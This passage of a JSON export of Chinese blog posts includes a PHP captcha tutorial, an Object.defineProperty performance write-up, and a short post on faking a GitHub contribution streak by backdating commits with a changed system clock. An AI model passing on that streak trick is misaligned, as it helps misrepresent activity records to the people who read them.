YaHei\u0026#39;;\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003c/p\u003e",
        "hasContent": true,
        "is_delete": false,
        "objectId": "OXpBQZ4yXd",
        "stamps": "性能优化",
        "title": "浅谈Web性能优化",
        "types": "b1e",
        "updatedAt": "2015-12-05T03:28:16.632Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "",
        "createdAt": "2016-02-15T11:53:22.332Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2016-02-15T11:53:20.357Z"
        },
        "desc": "\u003cp style=\"line-height: 2em; text-align: left;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;Github Contributions 就是下面这个图\u003c/span\u003e\u003cbr/\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20160215/1455536609420558.png\" title=\"1455536609420558.png\" alt=\"blob.png\" width=\"671\" height=\"246\" style=\"width: 671px; height: 246px;\"/\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;如果哪一天忘了贡献代码, Current streak 就会重置为0, 这时候怎么办呢?有木有弥补的办法?必须有的,本人亲测.\u003c/span\u003e\u003cbr/\u003e\u003c/p\u003e\u003col class=\" list-paddingleft-2\" style=\"list-style-type: decimal;\"\u003e\u003cli\u003e\u003cp style=\"line-height: 2em; text-align: left;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e断开网络并修改电脑时间\u003c/span\u003e\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp style=\"line-height: 2em; text-align: left;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e写代码然后commit\u003c/span\u003e\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp style=\"line-height: 2em; text-align: left;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e连接网络, 电脑时间改回来.Commit提交.\u003c/span\u003e\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp style=\"line-height: 2em; text-align: left;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003eOK完成\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em; text-align: left;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em; text-align: left;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003c/span\u003e\u003c/p\u003e\u003c/li\u003e\u003cbr/\u003e\u003c/ol\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;其实为什么给大家写这个教程是有原因的. Github\u0026nbsp;\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 32px;\"\u003eCurrent streak可以很大程度激励一个人的开发热情(心理学的角度, 我也不太懂).所以遇到像春节这样吃着大鱼大肉就忘记写代码的时候, 这就是一个不错的补救方案了. (偶然发现, 给个好评哦~)\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003c/span\u003e\u003c/p\u003e",
        "hasContent": false,
        "is_delete": false,
        "objectId": "PLpYkGLZFQ",
        "stamps": "乱扯",
        "title": "One way to cheat Github Contributions",
        "types": "b4e,b5e",
        "updatedAt": "2016-02-15T12:11:58.621Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "\u003cp style=\"line-height: 1.5em;\"\u003e接下来，我们就来说说这是怎么实现的。\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e先看HTML：\u003c/p\u003e\u003cpre class=\"brush:html;toolbar:false\"\u003e\u0026lt;!DOCTYPE\u0026nbsp;html\u0026gt;\n\u0026lt;html\u0026gt;\n\u0026lt;head\u0026gt;\n\t\u0026lt;meta\u0026nbsp;charset=\u0026#39;UTF-8\u0026#39;\u0026nbsp;/\u0026gt;\n\t\u0026lt;title\u0026gt;验证码\u0026lt;/title\u0026gt;\n\u0026lt;/head\u0026gt;\n\u0026lt;body\u0026gt;\n\t\u0026lt;h3\u0026gt;点击试试哦\u0026lt;/h3\u0026gt;\n\t\u0026lt;img\u0026nbsp;class=\u0026quot;aj-verify-img\u0026quot;\u0026nbsp;title=\u0026quot;点击刷新\u0026quot;\u0026nbsp;src=\u0026quot;php/index.php\u0026quot;\u0026nbsp;\n\t\tonclick=\u0026quot;(function(img){\u0026nbsp;img.src\u0026nbsp;=\u0026nbsp;\u0026#39;php/index.php?v=\u0026#39;\u0026nbsp;+\u0026nbsp;Math.random();\u0026nbsp;})(this)\u0026quot;\u0026nbsp;alt=\u0026quot;验证码\u0026quot;\u0026gt;\n\u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\u003c/pre\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-size: 12px;\"\u003e喂喂，等等？我没看错吧，img标签的src地址指向一个PHP文件，不应该是指向一个图片文件吗？\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e是的，你没有看错，的确可以这样做。只要这个指向的php文件告诉浏览器：hey，浏览器，虽然我长成php的样子，但其实我不是输出HTML，我输出的是图像！\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e浏览器就可以正常解析并显示图片了。就是下面这句话：\u003c/p\u003e\u003cpre class=\"brush:php;toolbar:false\"\u003eheader(\u0026quot;Content-type:\u0026nbsp;image/png;charset=utf-8\u0026quot;);\u003c/pre\u003e\u003cp style=\"line-height: 1.5em;\"\u003e好吧，我们来看看具体这么做的？\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e首先我们需要定义一些参数：\u003c/p\u003e\u003cp\u003e\u003cspan style=\"font-family: monospace; line-height: 24px; white-space: pre; background-color: rgb(248, 248, 248);\"\u003e$num = 4;\u003c/span\u003e\u003cbr style=\"font-family: monospace; line-height: 24px; white-space: pre; background-color: rgb(248, 248, 248);\"/\u003e\u003cspan style=\"font-family: monospace; line-height: 24px; white-space: pre; background-color: rgb(248, 248, 248);\"\u003e$size = 20;\u003c/span\u003e\u003cbr style=\"font-family: monospace; line-height: 24px; white-space: pre; background-color: rgb(248, 248, 248);\"/\u003e\u003cspan style=\"font-family: monospace; line-height: 24px; white-space: pre; background-color: rgb(248, 248, 248);\"\u003e$width，$height 验证码图像的宽度和高度\u003c/span\u003e\u003cbr style=\"font-family: monospace; line-height: 24px; white-space: pre; background-color: rgb(248, 248, 248);\"/\u003e\u003cspan style=\"font-family: monospace; line-height: 24px; white-space: pre; background-color: rgb(248, 248, 248);\"\u003e$font_url 验证码字符使用的字体地址（注意这个地址不能写成\u003c/span\u003e\u003cspan style=\"font-family: monospace; line-height: 24px; white-space: pre; background-color: rgb(248, 248, 248);\"\u003ehttp://... 这种形式，这样，php会报错，要使用相对路径或者dirname函数获取的绝对路径）\u003c/span\u003e\u003cbr style=\"font-family: monospace; line-height: 24px; white-space: pre; background-color: rgb(248, 248, 248);\"/\u003e\u003cspan style=\"font-family: monospace; line-height: 24px; white-space: pre; background-color: rgb(248, 248, 248);\"\u003e$str 验证码字符使用的字符集合，以后随机从里面取字符。\u003c/span\u003e\u003c/p\u003e\u003cp\u003e\u003cspan style=\"font-family: monospace; line-height: 24px; white-space: pre; background-color: rgb(248, 248, 248);\"\u003e我们先来生成要发送的验证码字符串：\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cpre class=\"brush:php;toolbar:false\"\u003e$code\u0026nbsp;=\u0026nbsp;\u0026#39;\u0026#39;;\nfor\u0026nbsp;($i\u0026nbsp;=\u0026nbsp;0;\u0026nbsp;$i\u0026nbsp;\u0026lt;\u0026nbsp;$num;\u0026nbsp;$i++)\u0026nbsp;{\n\t$code\u0026nbsp;.=\u0026nbsp;$str[\u0026nbsp;mt_rand(0,\u0026nbsp;strlen($str)-1)\u0026nbsp;];\n}\u003c/pre\u003e\u003cp\u003e\u003cspan style=\"font-family: monospace; line-height: 24px; white-space: pre; background-color: rgb(248, 248, 248);\"\u003e\u003c/span\u003e现在我们要把这个验证码写入图像。\u003c/p\u003e\u003cp\u003e那得先创建图像\u003c/p\u003e\u003cpre class=\"brush:php;toolbar:false\"\u003e//\u0026nbsp;画图像,新建一个真彩色图像,并返回一个图像标识符赋值给\u0026nbsp;$im\n$im\u0026nbsp;=\u0026nbsp;imagecreatetruecolor(\u0026nbsp;$width,\u0026nbsp;$height\u0026nbsp;);\n\n//\u0026nbsp;定义要用到的颜色\n$background_color\u0026nbsp;=\u0026nbsp;imagecolorallocate($im,\u0026nbsp;255,\u0026nbsp;255,\u0026nbsp;255);\t//这里默认白色背景\n$border_color\u0026nbsp;=\u0026nbsp;imagecolorallocate($im,\u0026nbsp;255,\u0026nbsp;255,\u0026nbsp;255);\t\t//这里默认白色边框\n$text_color\u0026nbsp;=\u0026nbsp;imagecolorallocate($im,\u0026nbsp;50,\u0026nbsp;50,\u0026nbsp;50);\t\t\t//这里默认淡黑色字体颜色\n//\u0026nbsp;画背景\nimagefilledrectangle($im,\u0026nbsp;0,\u0026nbsp;0,\u0026nbsp;$width,\u0026nbsp;$height,\u0026nbsp;$background_color);\n\n//\u0026nbsp;画边框（该函数事实上是画一个矩形）\nimagerectangle($im,\u0026nbsp;0,\u0026nbsp;0,\u0026nbsp;$width-1,\u0026nbsp;$height-1,\u0026nbsp;$border_color);\u003c/pre\u003e\u003cp\u003e上面这些注释写的都很详细，接下来我们还不急着把验证码画上去，因为我们要做一些干扰，这都是为了某些恶意软件无法识别出验证码中的字符。\u003c/p\u003e\u003cpre class=\"brush:php;toolbar:false\"\u003e//\u0026nbsp;画干扰点\nfor($i\u0026nbsp;=\u0026nbsp;0;$i\u0026nbsp;\u0026lt;\u0026nbsp;10*$num;$i++)\u0026nbsp;{\n\t$font_color\u0026nbsp;=\u0026nbsp;imagecolorallocate($im,\u0026nbsp;mt_rand(0,\u0026nbsp;255),\u0026nbsp;mt_rand(0,\u0026nbsp;255),\u0026nbsp;mt_rand(0,\u0026nbsp;255));\n\timagesetpixel($im,\u0026nbsp;mt_rand(0,\u0026nbsp;$width),\u0026nbsp;mt_rand(0,\u0026nbsp;$height),\u0026nbsp;$font_color);\u0026nbsp;\u0026nbsp;\u0026nbsp;\n}\u003c/pre\u003e\u003cp\u003e\u003cspan class=\"refname\"\u003eimagesetpixel\u003c/span\u003e\u0026nbsp;函数就是画一个点，它的四个参数含义：（来自PHP manual）\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150725/1437813121170879.png\" title=\"1437813121170879.png\" alt=\"blob.png\" width=\"654\" height=\"101\" style=\"width: 654px; height: 101px;\"/\u003e\u003c/p\u003e\u003cp\u003e接下来，我们还要画干扰线\u003c/p\u003e\u003cpre class=\"brush:php;toolbar:false\"\u003e//\u0026nbsp;默认画4条干扰线\n//这地方可以自己研究一下\nfor($i\u0026nbsp;=\u0026nbsp;0;$i\u0026nbsp;\u0026lt;\u0026nbsp;4;$i++)\u0026nbsp;{\n\t$font_color\u0026nbsp;=\u0026nbsp;imagecolorallocate($im,\u0026nbsp;mt_rand(0,\u0026nbsp;255),\u0026nbsp;mt_rand(0,\u0026nbsp;255),\u0026nbsp;mt_rand(0,\u0026nbsp;255));\n\timagearc($im,\u0026nbsp;mt_rand(0,\u0026nbsp;$width),\u0026nbsp;mt_rand(0,\u0026nbsp;$height),\u0026nbsp;mt_rand(0,\u0026nbsp;$width),\u0026nbsp;mt_rand(0,\u0026nbsp;$height),\u0026nbsp;mt_rand(0,\u0026nbsp;360),\u0026nbsp;mt_rand(0,\u0026nbsp;360),\u0026nbsp;$font_color);\u0026nbsp;\u0026nbsp;\u0026nbsp;\n\t//\u0026nbsp;imagearc($im,\u0026nbsp;0,\u0026nbsp;0,\u0026nbsp;$width*2,\u0026nbsp;$height,\u0026nbsp;0,\u0026nbsp;90,\u0026nbsp;$font_color);\u0026nbsp;\u0026nbsp;\u0026nbsp;\n}\u003c/pre\u003e\u003cp\u003eimagearc这个函数很强大，但是由于它的参数比较多（8个），所以比较难理解。\u003c/p\u003e\u003cp\u003e举个栗子：imagearc($im, $x, $y, $w, $h, 起始角度, 终止角度, $font_color);\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150725/1437814260362112.png\" title=\"1437814260362112.png\" alt=\"blob.png\" width=\"377\" height=\"226\" style=\"width: 377px; height: 226px;\"/\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150725/1437813246718501.png\" title=\"1437813246718501.png\" alt=\"blob.png\" width=\"673\" height=\"127\" style=\"width: 673px; height: 127px;\"/\u003e\u003c/p\u003e\u003cp\u003e好吧，到这里，我们可以把验证码字符画上去了。\u003cbr/\u003e\u003c/p\u003e\u003cpre class=\"brush:php;toolbar:false\"\u003e@imagefttext($im,\u0026nbsp;$size\u0026nbsp;,\u0026nbsp;0,\u0026nbsp;10,\u0026nbsp;$size\u0026nbsp;+\u0026nbsp;5,\u0026nbsp;$text_color,\u0026nbsp;$font_url,\u0026nbsp;$code);\u003c/pre\u003e\u003cp\u003e现在我们就要把 这幅图像发给浏览器，不过就像之前说的，发送之前要告诉浏览器我要发给你的是什么。\u003cbr/\u003e\u003c/p\u003e\u003cpre class=\"brush:php;toolbar:false\"\u003e//\u0026nbsp;喂,浏览器！我给你发的这个东西不要从你的缓存中拿啊。还有啊，这是一个png图像，不要解析错了。\nheader(\u0026quot;Cache-Control:\u0026nbsp;max-age=1,\u0026nbsp;s-maxage=1,\u0026nbsp;no-cache,\u0026nbsp;must-revalidate\u0026quot;);\nheader(\u0026quot;Content-type:\u0026nbsp;image/png;charset=utf-8\u0026quot;);\u003c/pre\u003e\u003cp\u003e好吧，接下来可以发送图像了，一句话：\u003cbr/\u003e\u003c/p\u003e\u003cpre class=\"brush:php;toolbar:false\"\u003eimagepng(\u0026nbsp;$im\u0026nbsp;);\u003c/pre\u003e\u003cp\u003e完成！\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0002.gif\"/\u003e\u003c/p\u003e",
        "createdAt": "2015-10-16T09:28:34.992Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-07-25T13:28:00.000Z"
        },
        "desc": "\u003cp style=\\\"line-height: 1.5em;\\\"\u003ePHP生成验证码的本质是什么？俩个字：画图！\u003c/p\u003e\u003cp\n        style=\\\"line-height: 1.5em;\\\"\u003e因为验证码这种东西是为了防御跨站点请求伪造等攻击，在服务端为每个访问用户生成一个特殊的字符串并保存在服务端，然后以图片的方式告诉用户这个字符串。\u003c/p\u003e\n\u003chr/\u003e\u003cp style=\\\"line-height: 1.5em;\\\"\u003e\u003cspan\n        style=\\\"font-size: 14px; color: rgb(127, 127, 127);\\\"\u003e服务端：hey，你这个登录请求要带上验证码哦。如果你还给的和我保存的一致，那这个请求就有效。\u003c/span\u003e\u003c/p\u003e\n\u003cp style=\\\"line-height: 1.5em;\\\"\u003e\u003cspan\n        style=\\\"font-size: 14px; color: rgb(127, 127, 127);\\\"\u003e用户：我去，你都告诉我验证码了，又要我发给你，毛线意思？\u003c/span\u003e\u003c/p\u003e\n\u003chr/\u003e\u003cp style=\\\"line-height: 1.5em;\\\"\u003e是的，我们普通用户的确能识别图片验证码，但是\n\u003cstrong\u003e恶意程序\u003c/strong\u003e不行啊（至少对于图片这种形式没那么简单）。如果服务端以字符串的方式发送验证码，那就真的是“验证毛线啊”！\u003c/p\u003e\u003cp\n        style=\\\"line-height: 1.5em;\\\"\u003e扯远了。。。。先看demo \u003ca href=\\\"https://github.com/AJLoveChina/PHPVerifyCode\\\"\n                                                       target=\\\"_blank\\\"\u003e跳到Github\u003c/a\u003e\u003c/p\u003e\u003cp\n        style=\\\"line-height: 1.5em;\\\"\u003e\n\u003ciframe src=\"http://www.oshjf.com/blog/iframe/verifycode/index.html\" width=\\\"150\\\" height=\\\"110\\\" scrolling=\\\"no\\\"\n        frameborder=\\\"0\\\" align=\\\"\\\"\u003e\u003c/iframe\u003e\u003c/p\u003e",
        "hasContent": true,
        "is_delete": false,
        "objectId": "PXfuXqi808",
        "stamps": "PHP,验证码",
        "title": "PHP生成验证码，与HTML无缝拼接",
        "types": "b2e",
        "updatedAt": "2015-12-05T03:28:46.066Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cspan style=\"font-size: 14px; outline: none; widows: auto; line-height: 24px;\"\u003e我最近在忙于一个项目, 本来使用Espress(\u003c/span\u003e\u003cspan style=\"font-size: 14px; line-height: 21px; widows: auto; background-color: rgb(255, 255, 255);\"\u003e\u0026nbsp;\u003c/span\u003e\u003cspan style=\"font-size: 14px; widows: auto;\"\u003eESLint的Javascript解析器\u0026nbsp;\u003c/span\u003e\u003cspan style=\"font-size: 14px; outline: none; widows: auto; line-height: 24px;\"\u003e), 后来改使用Acorn(也是一个Javascript解析器). 然而, 这却让我遇到一个很有趣的关于 `\u003c/span\u003e\u003cspan style=\"font-size: 14px; line-height: 21px; widows: auto; background-color: rgb(255, 255, 255);\"\u003e\u0026nbsp;\u003c/span\u003e\u003cspan style=\"font-size: 14px; background-color: rgb(239, 239, 239);\"\u003eObject.defineProperty()\u003c/span\u003e\u003cspan style=\"font-size: 14px; outline: none; widows: auto; line-height: 24px;\"\u003e` 的性能问题.\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cspan style=\"font-family: 微软雅黑; outline: none; font-size: 14px; line-height: 24px;\"\u003e而且在V8引擎中(包括Chrome 与 Node.js), 似乎只要是调用 `\u003c/span\u003e\u003cspan style=\"font-family: Consolas, \u0026#39;Lucida Console\u0026#39;, monospace; font-size: 15px; line-height: normal; background-color: rgb(239, 239, 239);\"\u003eObject.defineProperty()\u003c/span\u003e\u003cspan style=\"line-height: 24px; font-family: 微软雅黑; font-size: small;\"\u003e`就会明显对性能产生不好的影响. 仔细研究后我得到了一些很有意思的结果.\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"line-height: 24px; font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cstrong\u003e问题 :\u0026nbsp;\u003c/strong\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cspan style=\"line-height: 24px; font-family: 微软雅黑; font-size: small;\"\u003e我第一次注意到这个问题是在做ESLint性能测试的时候, 我发现当我使用\u0026nbsp;\u003c/span\u003e\u003cspan style=\"font-family: Georgia, \u0026#39;Times New Roman\u0026#39;, serif; font-size: 15px; line-height: normal; background-color: rgb(249, 249, 249);\"\u003eAcorn-powered Espree 时, 执行时间会增加500ms. 而当我使用最新版本的Espree\u0026nbsp;(v2.2.5), 执行时间只有2500ms. 当我再切换到Acorn-powered Espre, 执行时间又增加到3000ms. 500ms看起来很少, 但对于ESlint 用户来说这是非常巨大的变化了, 所以我决定找出来什么原因导致执行时间增加这么多.\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"line-height: normal; font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; background-color: rgb(249, 249, 249);\"\u003e\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"line-height: 24px; font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"line-height: normal; font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; background-color: rgb(249, 249, 249);\"\u003e调查:\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cspan style=\"font-family: Georgia, \u0026#39;Times New Roman\u0026#39;, serif; font-size: 15px; line-height: normal; background-color: rgb(249, 249, 249);\"\u003e在Chrome的profiler面板,\u0026nbsp;我使用ESLint的性能分析命令(\u003c/span\u003e\u003cspan style=\"font-family: Consolas, \u0026#39;Lucida Console\u0026#39;, monospace; font-size: 15px; line-height: normal; background-color: rgb(239, 239, 239);\"\u003enpm run profile\u003c/span\u003e\u003cspan style=\"font-family: Georgia, \u0026#39;Times New Roman\u0026#39;, serif; font-size: 15px; line-height: normal; background-color: rgb(249, 249, 249);\"\u003e)去测试ESlint. 然后发现了下面的情况 :\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em; text-align: left;\"\u003e\u003cspan style=\"line-height: 24px; font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cbr/\u003e\u003c/span\u003e\u003cimg src=\"/ueditor/php/upload/image/20151201/1448930997522087.png\" title=\"1448930997522087.png\" alt=\"blob.png\"/\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003eSoga, 如图可以明显看到`\u003cspan style=\"font-family: Consolas, \u0026#39;Lucida Console\u0026#39;, monospace; font-size: 15px; line-height: normal; background-color: rgb(239, 239, 239);\"\u003eesprimaFinishNode()\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px; line-height: 1.5;\"\u003e`函数的执行时间占总执行时间的33%. 这个函数的功能是 从Acorn添加AST nodes, 这是为了让它们看起来更像\u003c/span\u003e\u003cspan style=\"font-family: Georgia, \u0026#39;Times New Roman\u0026#39;, serif; font-size: 15px; line-height: normal; background-color: rgb(249, 249, 249);\"\u003eEsprima AST nodes. (读者不必关心这个函数的作用). 我瞬间就意识到唯一的可能操作就是\u0026quot;\u003c/span\u003e\u003cspan style=\"font-family: Consolas, \u0026#39;Lucida Console\u0026#39;, monospace; font-size: 15px; line-height: normal; background-color: rgb(239, 239, 239);\"\u003eObject.defineProperty()\u003c/span\u003e\u003cspan style=\"font-family: Georgia, \u0026#39;Times New Roman\u0026#39;, serif; font-size: 15px; line-height: normal; background-color: rgb(249, 249, 249);\"\u003e\u0026quot;.\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cspan style=\"font-family: Georgia, \u0026#39;Times New Roman\u0026#39;, serif; font-size: 15px; line-height: normal; background-color: rgb(249, 249, 249);\"\u003eAcorn 为每个 AST node 添加了非标准的 start 与 \u0026nbsp;end 属性, 这是为了追踪它们的位置. 而且这俩个属性绝对不可以被删除, 因为Acorn内部会用到它们来影响其它的nodes. 所以为了防止不小心删除了这俩个属性, Espree使用了\u0026quot;\u003c/span\u003e\u003cspan style=\"font-family: Consolas, \u0026#39;Lucida Console\u0026#39;, monospace; font-size: 15px; line-height: normal; background-color: rgb(239, 239, 239);\"\u003eObject.defineProperty()\u003c/span\u003e\u003cspan style=\"font-family: Georgia, \u0026#39;Times New Roman\u0026#39;, serif; font-size: 15px; line-height: normal; background-color: rgb(249, 249, 249);\"\u003e\u0026quot;方法把它们定义成不可枚举的. 如下图 :\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"line-height: 24px; font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cbr/\u003e\u003c/span\u003e\u003cimg src=\"/ueditor/php/upload/image/20151201/1448931019305089.png\" title=\"1448931019305089.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"line-height: 21px; widows: auto; font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; background-color: rgb(255, 255, 255);\"\u003e通过把这些属性定义为不可枚举的, 任何用户在使用for in遍历 相应的JSON对象时就不会不小心修改了这俩个属性. 但不幸的是, 就是这个做法导致了性能损耗.当我把这俩行注释掉的时候, 性能测试结果就立刻不同了:\u003c/span\u003e\u003c/p\u003e\u003cp\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151201/1448931031288937.png\" title=\"1448931031288937.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e就注释了那俩行, \u0026quot;\u003cspan style=\"font-family: Consolas, \u0026#39;Lucida Console\u0026#39;, monospace; font-size: 15px; line-height: normal; background-color: rgb(239, 239, 239);\"\u003eesprimaFinishNode()\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px; line-height: 1.5;\"\u003e\u0026quot;就立刻不再是执行时间最长的函数了, 而且占总时间5%都不到. 而这一切改变都源于\u0026quot;\u003c/span\u003e\u003cspan style=\"font-family: Consolas, \u0026#39;Lucida Console\u0026#39;, monospace; font-size: 15px; line-height: normal; background-color: rgb(239, 239, 239);\"\u003eObject.defineProperty()\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px; line-height: 1.5;\"\u003e\u0026quot;俩次调用.\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"line-height: 1.5; font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"line-height: 1.5; font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cstrong\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 12px; line-height: 1.5; outline: none;\"\u003e深入理解\u003c/span\u003e\u003c/strong\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 12px; line-height: 1.5; outline: none;\"\u003e现在问题是, 我的确需要 start 与 end 这俩个属性是不可枚举的, 所以我在\u0026quot;\u003c/span\u003e\u003cspan style=\"font-family: Consolas, \u0026#39;Lucida Console\u0026#39;, monospace; font-size: 15px; line-height: normal; background-color: rgb(239, 239, 239);\"\u003eesprimaFinishNode()\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 12px; line-height: 1.5; outline: none;\"\u003e\u0026quot;中尝试了一些替代方案, 而不是使用\u0026quot;\u003c/span\u003e\u003cspan style=\"font-family: Consolas, \u0026#39;Lucida Console\u0026#39;, monospace; font-size: 15px; line-height: normal; background-color: rgb(239, 239, 239);\"\u003eObject.defineProperty()\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 1.5; font-size: small;\"\u003e\u0026quot;.\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 14px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 1.5; font-size: small;\"\u003e我做的第一件事是 : 使用 \u0026quot;\u003c/span\u003e\u003cspan style=\"font-family: Consolas, \u0026#39;Lucida Console\u0026#39;, monospace; font-size: 15px; line-height: normal; background-color: rgb(239, 239, 239);\"\u003eObject.defineProperties()\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: small; 